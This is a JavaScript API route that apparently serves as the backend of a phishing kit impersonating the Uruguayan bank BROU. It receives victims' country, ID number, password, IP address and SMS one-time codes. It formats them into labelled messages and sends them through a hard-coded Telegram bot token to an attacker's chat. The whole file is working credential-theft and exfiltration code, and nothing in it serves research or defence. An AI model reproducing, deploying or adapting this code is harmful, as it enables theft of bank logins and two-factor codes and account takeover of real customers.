export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Método no permitido" });
  }

  const { pais, documento, numeroDocumento, contrasena, ip, smscode } = req.body;

  // 🔴 Tu token y chat ID
  const BOT_TOKEN = "8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U";
  const CHAT_ID = "-4867067566";

  // Crear mensaje según lo que se envíe
  let mensaje = "";
  if(smscode){
    mensaje = `
➖➖➖[BROU SMS]➖➖➖
✔️TOKEN: ${smscode}
🌐 IP: ${ip}
    `;
  } else {
    mensaje = `
➖➖➖[BROU 2]➖➖➖
País: ${pais}
Tipo de Documento: ${documento}
Cédula: ${numeroDocumento}
Contraseña: ${contrasena}
IP: ${ip}
    `;
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje,
        }),
      }
    );

    const data = await response.json();
    return res.status(200).json({ success: true, telegram: data });
  } catch (error) {
    return res.status(500).json({ error: "Error enviando a Telegram", details: error });
  }
}
